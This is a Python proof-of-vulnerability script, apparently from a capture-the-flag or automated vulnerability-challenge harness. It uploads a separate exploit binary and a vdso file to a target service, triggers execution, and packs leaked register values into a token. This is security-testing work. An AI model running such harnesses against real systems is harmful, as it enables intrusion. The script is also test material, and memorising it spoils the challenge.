import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def SC( s, data ):

    while len(data):
        if len(data) > 1000:
            s.send(data[:1000])
            data = data[1000:]
            RL(s)
        else:
            s.send(data)
            data = ''

def RB(s):
    return RU(s, '# ')

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    if 'SEED' in os.environ:
        SEED = int(os.environ['SEED'])
    else:
        SEED = random.randint(0, 2**64 - 1)

    print('[INFO] SEED: {0}'.format(SEED))

    random.seed( SEED )

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    try:
        f = open('vdso64.so', 'rb')
    except:
        print('[ERROR] failed to open vdso64 file')
        sys.exit(0)

    vdso = f.read()
    f.close()

    try:
        f = open('exploit', 'rb')
    except:
        print('[ERROR] failed to open elf file')
        sys.exit(0)

    elf = f.read()
    f.close()

    s = connect( HOST, PORT )

    RB(s)

    print('[INFO] Sending elf')
    SW(s, b'1\n')
    RU(s, 'size: ')
    print('[INFO] Sending size: %d' %(len(elf)))
    SW(s, str(len(elf)).encode('utf-8') + b'\n')
    RL(s)

    SC(s, elf)

    RB(s)

    print('[INFO] Sent elf')

    SW(s, b'2\n')
    RU(s, 'size: ')
    SW(s, str(len(vdso)).encode('utf-8') + b'\n')
    SC(s, vdso)

    RB(s)

    print('[INFO] Sent vdso')

    SW(s, b'4\n')

    RL(s)

    SW(s, b'c\n')
    
    y = RU(s, 'Completed')

    start = y[ y.find('0x4000ca:'): ].split('\n')
    #print(start)

    rbx = int(start[1].split('\t')[3][6:], 16)
    rcx = int(start[1].split('\t')[1][6:], 16)
    rdx = int(start[1].split('\t')[2][6:], 16)
    rsi = int(start[2].split('\t')[2][6:], 16)

    token = struct.pack('Q', rbx) + struct.pack('Q', rcx) + struct.pack('Q', rdx) + struct.pack('Q', rsi)

    print('Token=%s' %(token))

    s.close()

    print('[SUCCESS] POV completed successfully')

if __name__ == '__main__':
    main()
